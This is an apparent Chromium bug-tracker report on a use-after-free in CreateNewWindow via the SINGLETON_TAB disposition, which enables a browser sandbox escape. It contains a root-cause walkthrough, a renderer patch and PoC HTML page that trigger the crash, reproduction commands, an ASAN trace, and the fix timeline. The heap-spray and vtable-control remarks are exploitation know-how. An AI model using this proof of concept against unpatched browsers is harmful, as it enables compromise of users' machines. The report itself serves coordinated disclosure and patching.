# Use-after-free in CreateNewWindow via SINGLETON_TAB disposition leads to sandbox escape

| Field | Value |
|-------|-------|
| **Issue ID** | [487338366](https://issues.chromium.org/issues/487338366) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WindowDialog |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | sz...@chromium.org |
| **Created** | 2026-02-25 |
| **Bounty** | $90,000.00 |

## Description

# Use-after-free in CreateNewWindow via SINGLETON\_TAB disposition leads to sandbox escape

## Summary

A use-after-free vulnerability exists in `RenderFrameHostImpl::CreateNewWindow()` in the Chromium browser process. When a compromised renderer sends a `CreateNewWindow` IPC with the `SINGLETON_TAB` disposition and a target URL that matches an existing tab, the browser process creates a new WebContents object but then synchronously destroys it in `Navigate()` while still returning a non-null pointer. The caller subsequently dereferences the freed `RenderFrameHostImpl` and `RenderWidgetHostImpl` objects, producing a use-after-free on the browser process UI thread. Because the dangling pointers are local `auto*` variables rather than `raw_ptr<T>` fields, MiraclePtr does not protect them, and the crash is confirmed exploitable by ASAN. A compromised renderer can leverage this to escape the sandbox and achieve code execution in the browser process.

## Bisect

Introducing Commit: `6f6e57cb3244ac478d5bef46cf60b81f984e83a0`

- Date: 2025-03-19
- Author: Stefan Zager ([szager@chromium.org](mailto:szager@chromium.org))
- Review: <https://chromium-review.googlesource.com/c/chromium/src/+/6343761>

This commit combined the previously separate `CreateNewWindow` (sync) and `ShowCreatedWindow` (async) renderer-to-browser IPCs into a single synchronous IPC. The inline call to `ShowCreatedWindow()` within `CreateNewWindow()` introduced the assumption that a non-null return from `ShowCreatedWindow` guarantees the newly created objects are still alive. The feature flag `kCombineNewWindowIPCs` guarding this code was later removed in commit `b02f846752ba3b0e574aee9bb23bab4cb71e202a` (2026-02-09, same author, review <https://chromium-review.googlesource.com/c/chromium/src/+/7560632>), making the vulnerable path unconditional.

## Root Cause

When a renderer process calls `window.open()`, it sends a synchronous `content.mojom.FrameHost.CreateNewWindow` IPC to the browser process. The handler in `RenderFrameHostImpl::CreateNewWindow()` delegates to `WebContentsImpl::CreateNewWindow()` to allocate a new WebContents with its associated FrameTree, RenderFrameHostImpl, and RenderWidgetHostImpl. It then captures raw pointers to these objects:

```
// content/browser/renderer_host/render_frame_host_impl.cc
RenderFrameHostImpl* new_main_rfh =
    new_frame_tree->root()->current_frame_host();
// ...
auto* new_rwh = new_main_rfh->GetLocalRenderWidgetHost();

```

After constructing the reply message with initial values from these pointers, the code calls `ShowCreatedWindow()` to hand the new WebContents to the browser UI layer. There is a comment (labeled NOTE) acknowledging that `ShowCreatedWindow` may return nullptr if the new WebContents is destroyed during this call, and in that case the dangling pointers are nulled out:

```
// content/browser/renderer_host/render_frame_host_impl.cc
WebContents* shown_contents = delegate()->ShowCreatedWindow(
    this, new_rwh->GetRoutingID(), params->disposition, *params->features,
    params->consumes_user_activation);

if (!shown_contents) {
    // These point to freed memory, so null them out to prevent inadvertent
    // UAF in the future (see NOTE above).
    new_frame_tree = nullptr;
    new_main_rfh = nullptr;
    new_rwh = nullptr;
} else if (new_main_rfh->GetView()) {
    // Cannot populate window geometry until after ShowCreatedWindow().
    reply->widget_screen_rect.emplace(new_main_rfh->GetView()->GetViewBounds());
    reply->window_screen_rect.emplace(
        new_main_rfh->GetView()->GetBoundsInRootWindow());
    reply->visual_properties = new_rwh->GetVisualProperties();
}

```

The vulnerability lies in the `else if` branch. The code assumes that a non-null `shown_contents` means the newly created WebContents is still alive and `new_main_rfh`/`new_rwh` are valid. However, `ShowCreatedWindow` can return a non-null pointer to a completely different, pre-existing WebContents while the newly created one has already been destroyed.

The destruction path flows through `ShowCreatedWindow` into the Chrome browser UI layer. `WebContentsImpl::ShowCreatedWindow()` calls `delegate->AddNewContents()`, which resolves to `Browser::AddNewContents()`, then `chrome::AddWebContents()`. This function constructs a `NavigateParams` structure with the new WebContents as `contents_to_insert` and the renderer-supplied disposition, then calls `Navigate()`:

```
// chrome/browser/ui/browser_tabstrip.cc
NavigateParams params(browser, std::move(new_contents));
params.source_contents = source_contents;
params.url = target_url;
params.disposition = disposition;
// ...
Navigate(&params);
return params.navigated_or_inserted_contents;

```

Inside `Navigate()`, the function initializes `singleton_index` to -1 and then calls `GetBrowserAndTabForDisposition()` to determine where the navigation should go. For the `SINGLETON_TAB` disposition, this function calls `GetIndexOfExistingTab()`, which searches the browser's tab strip for a tab whose URL matches the navigation target. If a match is found, the function returns that tab's index:

```
// chrome/browser/ui/browser_navigator.cc
case WindowOpenDisposition::SINGLETON_TAB: {
    if (params.browser) {
        int index = GetIndexOfExistingTab(params.browser, params);
        if (index >= 0) {
            return {params.browser, index};
        }
    }
    // ...
}

```

When `singleton_index` is non-negative, `Navigate()` sets `contents_to_navigate_or_insert` to the existing tab's WebContents. Critically, the code that adds the new WebContents to the tab strip is gated on `singleton_index == -1`:

```
// chrome/browser/ui/browser_navigator.cc
std::unique_ptr<tabs::TabModel> tab_to_insert;
if (params->contents_to_insert) {
    tab_to_insert = std::make_unique<tabs::TabModel>(
        std::move(params->contents_to_insert),
        params->browser->GetBrowserForMigrationOnly()->tab_strip_model());
    // ...
}
// ...
if (singleton_index != -1) {
    contents_to_navigate_or_insert =
        params->browser->GetBrowserForMigrationOnly()
            ->tab_strip_model()
            ->GetWebContentsAt(singleton_index);
}
// ...
} else if (singleton_index == -1) {
    // ...
    params->browser->GetBrowserForMigrationOnly()->tab_strip_model()->AddTab(
        std::move(tab_to_insert), ...);
}
// tab_to_insert goes out of scope here and is destroyed if not moved

```

When `singleton_index >= 0`, the `AddTab` call is skipped. The `tab_to_insert` unique\_ptr, which now owns the newly created WebContents, is never moved into the tab strip. When `Navigate()` returns, `tab_to_insert` goes out of scope, triggering `TabModel::~TabModel()` which destroys the WebContents and all its children, including the RenderFrameHostImpl that `new_main_rfh` points to. Meanwhile, `Navigate()` sets `navigated_or_inserted_contents` to the pre-existing tab's WebContents, and this non-null pointer propagates all the way back through `AddWebContents` and `ShowCreatedWindow` to `CreateNewWindow`.

Back in `CreateNewWindow`, `shown_contents` is non-null (pointing to the existing tab), so the code enters the `else if` branch and dereferences `new_main_rfh->GetView()`, which accesses freed heap memory. The freed `RenderFrameHostImpl` is a 5656-byte object that can be replaced with attacker-controlled data via heap spraying, giving the attacker control over the vtable pointer and enabling arbitrary code execution in the browser process.

The affected pointers `new_main_rfh` and `new_rwh` are local `auto*` variables on the stack, not `raw_ptr<T>` fields. As confirmed by ASAN's output ("MiraclePtr Status: NOT PROTECTED"), MiraclePtr cannot mitigate this vulnerability.

A compromised renderer can trigger this by setting the `disposition` field in the `CreateNewWindowParams` Mojo message to `WindowOpenDisposition::SINGLETON_TAB` (value 12) and the `target_url` to a URL that already has an open tab in the browser. This is fully within the capabilities of a compromised renderer since the disposition is just an enum field in the IPC message with no browser-side validation restricting it to specific values. Similarly, an installed PWA with `launch_handler.client_mode` set to `navigate-existing` can produce the same effect through the navigation capturing path, where `NavigationCapturingProcess::CapturedNavigateExisting()` sets `singleton_index` to a valid tab index.

## Reproduce

The proof of concept consists of two components: (1) a renderer patch that overrides the window open disposition to `SINGLETON_TAB` (simulating a compromised renderer), and (2) a single HTML page that triggers the UAF.

### 1. Apply renderer patch

Apply the following patch to `content/renderer/render_frame_impl.cc`:

```
--- a/content/renderer/render_frame_impl.cc
+++ b/content/renderer/render_frame_impl.cc
@@ -6792,6 +6792,12 @@
   params->frame_name = frame_name_utf8;
   params->opener_suppressed = features.noopener;
   params->disposition = NavigationPolicyToDisposition(policy);
+  // PoC: compromised renderer forces SINGLETON_TAB disposition
+  if (params->disposition == WindowOpenDisposition::NEW_FOREGROUND_TAB ||
+      params->disposition == WindowOpenDisposition::NEW_BACKGROUND_TAB) {
+    params->disposition = WindowOpenDisposition::SINGLETON_TAB;
+  }
   if (!request.IsNull()) {
     params->target_url = request.Url();

```

Rebuild:

```
autoninja -C out/asan-release chrome

```
### 2. Start HTTP server

In the directory containing `poc_createwindow_singleton_uaf.html`:

```
python3 -m http.server 8888

```
### 3. Launch Chrome and visit PoC URL

```
ASAN_OPTIONS=detect_odr_violation=0 ./out/asan-release/chrome \
  --no-sandbox --disable-gpu \
  --user-data-dir=/tmp/poc-singleton-uaf \
  http://localhost:8888/poc_createwindow_singleton_uaf.html

```

The page automatically opens a duplicate tab (`#dup`), then the duplicate fires `window.open()` back to the original URL. With the SINGLETON\_TAB disposition override, the browser finds the existing tab (singleton\_index >= 0), destroys the newly created WebContents, and returns the existing one as non-null. `CreateNewWindow` then dereferences the freed `new_main_rfh`, triggering the ASAN heap-use-after-free.

### PoC HTML (`poc_createwindow_singleton_uaf.html`)

```
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>PoC</title></head>
<body>
<script>
if (!location.hash) {
  // First load: open a duplicate of ourselves, marked with #dup
  window.open(location.href + '#dup', '_blank');
} else {
  // We are the duplicate (#dup). After a delay, fire window.open() back to
  // the original URL (without hash) to trigger singleton matching -> UAF.
  setTimeout(function() {
    var target = location.href.replace('#dup', '');
    for (var i = 0; i < 5; i++) {
      setTimeout(function() { window.open(target, '_blank'); }, i * 300);
    }
  }, 2000);
}
</script>
</body></html>

```

ASAN output:

```
=================================================================
==1757573==ERROR: AddressSanitizer: heap-use-after-free on address 0x7dd4f3337900 at pc 0x7fb565b4f261 bp 0x7ffc94dffb70 sp 0x7ffc94dffb68
READ of size 8 at 0x7dd4f3337900 thread T0 (chrome)
    #0 0x7fb565b4f260 in content::RenderFrameHostImpl::CreateNewWindow(mojo::StructPtr<content::mojom::CreateNewWindowParams>, base::OnceCallback<void (content::mojom::CreateNewWindowStatus, mojo::StructPtr<content::mojom::CreateNewWindowReply>)>) content/browser/renderer_host/render_frame_host_impl.cc:10181:28
    #1 0x7fb56348ebf2 in content::mojom::FrameHostStubDispatch::AcceptWithResponder(content::mojom::FrameHost*, mojo::Message*, std::__Cr::unique_ptr<mojo::MessageReceiverWithStatus, std::__Cr::default_delete<mojo::MessageReceiverWithStatus>>) gen/content/common/frame.mojom.cc:6279:13
    #2 0x7fb57257f29e in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1036:56
    #3 0x7fb5725965b0 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:51:24
    #4 0x7fb572584ba4 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #5 0x7fb55dfe538f in IPC::ChannelAssociatedGroupController::AcceptSyncMessage(unsigned int, unsigned int, IPC::(anonymous namespace)::ScopedUrgentMessageNotification) ipc/ipc_mojo_bootstrap.cc:1242:24
    #6 0x7fb55dfe7577 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #7 0x7fb571960c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #8 0x7fb5719e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #9 0x7fb5719e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #10 0x7fb571bb6a97 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:736:46
    #11 0x7fb571bba242 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:355:43
    #12 0x7fb52c91ad3a in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: 6b4f160dbc5397c2f502dc4f08a8cff259917926)

0x7dd4f3337900 is located 0 bytes inside of 5656-byte region [0x7dd4f3337900,0x7dd4f3338f18)
freed by thread T0 (chrome) here:
    #0 0x556a70db840d in operator delete(void*) (/home/test/chromium/src/out/asan-release/chrome+0x682b40d) (BuildId: 9182ae9d429f4c1b)
    #1 0x7fb565c1e873 in content::RenderFrameHostManager::~RenderFrameHostManager() gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #2 0x7fb5657c73d2 in content::FrameTreeNode::~FrameTreeNode() content/browser/renderer_host/frame_tree_node.cc:312:1
    #3 0x7fb5657af6b9 in content::FrameTree::~FrameTree() content/browser/renderer_host/frame_tree.cc:230:1
    #4 0x7fb5663660d1 in content::WebContentsImpl::~WebContentsImpl() content/browser/web_contents/web_contents_impl.cc:1496:1
    #5 0x7fb566368e6d in content::WebContentsImpl::~WebContentsImpl() content/browser/web_contents/web_contents_impl.cc:1376:37
    #6 0x556a75df5586 in tabs::TabModel::~TabModel() gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #7 0x556a7d296aa5 in Navigate(NavigateParams*) gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #8 0x556a7d2a670f in chrome::AddWebContents(Browser*, content::WebContents*, std::__Cr::unique_ptr<content::WebContents, std::__Cr::default_delete<content::WebContents>>, GURL const&, WindowOpenDisposition, blink::mojom::WindowFeatures const&, NavigateParams::WindowAction, bool) chrome/browser/ui/browser_tabstrip.cc:109:3
    #9 0x556a7d213ccd in Browser::AddNewContents(content::WebContents*, std::__Cr::unique_ptr<content::WebContents, std::__Cr::default_delete<content::WebContents>>, GURL const&, WindowOpenDisposition, blink::mojom::WindowFeatures const&, bool, bool*) chrome/browser/ui/browser.cc:2117:10
    #10 0x556a7d213e67 in non-virtual thunk to Browser::AddNewContents(...) chrome/browser/ui/browser.cc
    #11 0x7fb5663aeda1 in content::WebContentsImpl::ShowCreatedWindow(content::RenderFrameHostImpl*, int, WindowOpenDisposition, blink::mojom::WindowFeatures const&, bool) content/browser/web_contents/web_contents_impl.cc:5694:20
    #12 0x7fb565b4de98 in content::RenderFrameHostImpl::CreateNewWindow(mojo::StructPtr<content::mojom::CreateNewWindowParams>, base::OnceCallback<void (content::mojom::CreateNewWindowStatus, mojo::StructPtr<content::mojom::CreateNewWindowReply>)>) content/browser/renderer_host/render_frame_host_impl.cc:10168:45
    #13 0x7fb56348ebf2 in content::mojom::FrameHostStubDispatch::AcceptWithResponder(content::mojom::FrameHost*, mojo::Message*, std::__Cr::unique_ptr<mojo::MessageReceiverWithStatus, std::__Cr::default_delete<mojo::MessageReceiverWithStatus>>) gen/content/common/frame.mojom.cc:6279:13
    #14 0x7fb57257f29e in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1036:56
    #15 0x7fb5725965b0 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:51:24
    #16 0x7fb572584ba4 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #17 0x7fb55dfe538f in IPC::ChannelAssociatedGroupController::AcceptSyncMessage(unsigned int, unsigned int, IPC::(anonymous namespace)::ScopedUrgentMessageNotification) ipc/ipc_mojo_bootstrap.cc:1242:24
    #18 0x7fb55dfe7577 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #19 0x7fb571960c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #20 0x7fb5719e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #21 0x7fb5719e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #22 0x7fb571bb6a97 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:736:46
    #23 0x7fb571bba242 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:355:43
    #24 0x7fb52c91ad3a in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: 6b4f160dbc5397c2f502dc4f08a8cff259917926)

previously allocated by thread T0 (chrome) here:
    #0 0x556a70db7bcd in operator new(unsigned long) (/home/test/chromium/src/out/asan-release/chrome+0x682abcd) (BuildId: 9182ae9d429f4c1b)
    #1 0x7fb565ade0d6 in content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr<content::RenderViewHostImpl>, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, mojo::PendingAssociatedRemote<content::mojom::Frame>, base::TokenType<blink::LocalFrameTokenTypeMarker> const&, base::TokenType<blink::DocumentTokenTypeMarker> const&, base::UnguessableToken, bool, content::RenderFrameHostImpl::LifecycleStateImpl, scoped_refptr<content::BrowsingContextState>) content/public/browser/render_frame_host.h:148:3
    #2 0x7fb565c21543 in content::RenderFrameHostManager::CreateRenderFrameHost(content::RenderFrameHostManager::CreateFrameCase, content::SiteInstanceImpl*, int, mojo::PendingAssociatedRemote<content::mojom::Frame>, base::TokenType<blink::LocalFrameTokenTypeMarker> const&, base::TokenType<blink::DocumentTokenTypeMarker> const&, base::UnguessableToken, bool, scoped_refptr<content::BrowsingContextState>, content::ProcessAllocationContext const&) content/browser/renderer_host/render_frame_host_manager.cc:4279:10
    #3 0x7fb565c20426 in content::RenderFrameHostManager::InitRoot(content::SiteInstanceImpl*, bool, blink::FramePolicy, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, base::UnguessableToken const&) content/browser/renderer_host/render_frame_host_manager.cc:717:22
    #4 0x7fb5657b8687 in content::FrameTree::Init(content::SiteInstanceImpl*, bool, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::RenderFrameHostImpl*, blink::FramePolicy const&, base::UnguessableToken const&) content/browser/renderer_host/frame_tree.cc:963:27
    #5 0x7fb566395f8b in content::WebContentsImpl::Init(content::WebContents::CreateParams const&, blink::FramePolicy) content/browser/web_contents/web_contents_impl.cc:4178:23
    #6 0x7fb566359ae1 in content::WebContentsImpl::CreateWithOpener(content::WebContents::CreateParams const&, content::RenderFrameHostImpl*) content/browser/web_contents/web_contents_impl.cc:1577:17
    #7 0x7fb5663aa709 in content::WebContentsImpl::CreateNewWindow(content::RenderFrameHostImpl*, content::mojom::CreateNewWindowParams const&, bool, bool, content::SessionStorageNamespace*) content/browser/web_contents/web_contents_impl.cc:786:10
    #8 0x7fb565b4ce3a in content::RenderFrameHostImpl::CreateNewWindow(mojo::StructPtr<content::mojom::CreateNewWindowParams>, base::OnceCallback<void (content::mojom::CreateNewWindowStatus, mojo::StructPtr<content::mojom::CreateNewWindowReply>)>) content/browser/renderer_host/render_frame_host_impl.cc:10083:18
    #9 0x7fb56348ebf2 in content::mojom::FrameHostStubDispatch::AcceptWithResponder(content::mojom::FrameHost*, mojo::Message*, std::__Cr::unique_ptr<mojo::MessageReceiverWithStatus, std::__Cr::default_delete<mojo::MessageReceiverWithStatus>>) gen/content/common/frame.mojom.cc:6279:13
    #10 0x7fb57257f29e in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1036:56
    #11 0x7fb5725965b0 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:51:24
    #12 0x7fb572584ba4 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #13 0x7fb55dfe538f in IPC::ChannelAssociatedGroupController::AcceptSyncMessage(unsigned int, unsigned int, IPC::(anonymous namespace)::ScopedUrgentMessageNotification) ipc/ipc_mojo_bootstrap.cc:1242:24
    #14 0x7fb55dfe7577 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #15 0x7fb571960c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #16 0x7fb5719e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #17 0x7fb5719e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #18 0x7fb571bb6a97 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:736:46
    #19 0x7fb571bba242 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:355:43
    #20 0x7fb52c91ad3a in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: 6b4f160dbc5397c2f502dc4f08a8cff259917926)

SUMMARY: AddressSanitizer: heap-use-after-free content/browser/renderer_host/render_frame_host_impl.cc:10181:28 in content::RenderFrameHostImpl::CreateNewWindow(mojo::StructPtr<content::mojom::CreateNewWindowParams>, base::OnceCallback<void (content::mojom::CreateNewWindowStatus, mojo::StructPtr<content::mojom::CreateNewWindowReply>)>)
Shadow bytes around the buggy address:
  0x7dd4f3337680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7dd4f3337700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7dd4f3337780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7dd4f3337800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7dd4f3337880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x7dd4f3337900:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7dd4f3337980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7dd4f3337a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7dd4f3337a80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7dd4f3337b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7dd4f3337b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==1757573==ADDITIONAL INFO

==1757573==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7fb55dfdada2 in IPC::ChannelAssociatedGroupController::Accept(mojo::Message*) ipc/ipc_mojo_bootstrap.cc:1118:15
    #1 0x7fb57215688a in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) mojo/public/cpp/system/simple_watcher.cc:103:13


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==1757573==END OF ADDITIONAL INFO

==1757573==ABORTING

```
## References

- <https://source.chromium.org/chromium/chromium/src/+/main:content/browser/renderer_host/render_frame_host_impl.cc;l=10166-10182>
- <https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/browser_navigator.cc;l=647-667>
- <https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/browser_navigator.cc;l=772-893>
- <https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/browser_tabstrip.cc;l=81-111>
- <https://source.chromium.org/chromium/chromium/src/+/main:content/browser/web_contents/web_contents_impl.cc;l=5694>

## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [reproduce.mp4](attachments/reproduce.mp4) (video/mp4, 4.0 MB)
- [spray.html](attachments/spray.html) (text/html, 2.4 KB)
- [index.html](attachments/index.html) (text/html, 7.2 KB)
- [renderer.patch](attachments/renderer.patch) (text/x-diff, 5.2 KB)
- [README.md](attachments/README.md) (text/markdown, 6.0 KB)
- renderer.patch (text/x-diff, 1.6 KB)
- [run_servers.py](attachments/run_servers.py) (text/x-python, 787 B)
- spray.html (text/html, 1.9 KB)
- index.html (text/html, 2.8 KB)

## Timeline

### je...@gmail.com (2026-02-25)

Sorry, I made a mistake copying the report command line. The line "--no-sandbox --disable-gpu " is not needed, please ignore it. The complete exploit is being written and currently I can already control the PC.

### li...@chromium.org (2026-02-25)

@sz...@chromium.org do you mind taking a look at this or rerouting as necessary?

### ch...@google.com (2026-02-26)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2026-02-26)

Project: chromium/src  

Branch:  main  

Author:  Stefan Zager [szager@chromium.org](mailto:szager@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7610581>

Fix CreateNewWindow() to correctly handle a reused tab

---


Expand for full commit details
```
     
    Under normal circumstances, a non-null return value from 
    `ShowCreatedWindow()` will return the WebContents that was created by 
    the earlier call to `CreateNewWindow()`. However, under certain 
    circumstances `ShowCreatedWindow()` will return a different pre-existing 
    WebContents and allow the just-created WebContents to expire, along with 
    its frame tree node, widget host, and frame host. 
     
    This CL ensures that the code doesn't rely on any of the newly-created 
    objects after the call to `ShowCreatedWindow()`, and instead uses the 
    normal accessors on WebContents to retrieve them. 
     
    Bug: 487338366 
    Change-Id: I84a5c5cf7f395d708baf71c6a43b39e4099f61ad 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7610581 
    Reviewed-by: Charlie Reis <creis@chromium.org> 
    Commit-Queue: Stefan Zager <szager@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1590960}

```

---

Files:

- M `content/browser/renderer_host/render_frame_host_impl.cc`

---

Hash: [3c20517b961d59dea34098ef7e9fd4ca955eb081](https://chromiumdash.appspot.com/commit/3c20517b961d59dea34098ef7e9fd4ca955eb081)  

Date: Thu Feb 26 19:02:46 2026


---

### ch...@google.com (2026-02-27)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1590960) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1590960) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1590960) appears to be after beta branch point (1582197).
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### sz...@chromium.org (2026-02-27)

This landed in canary today (Feb. 27). I'm going to give it the weekend to bake and I'll reply to the merge questionnaire on Monday.

### ch...@google.com (2026-02-27)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-27)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-27)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
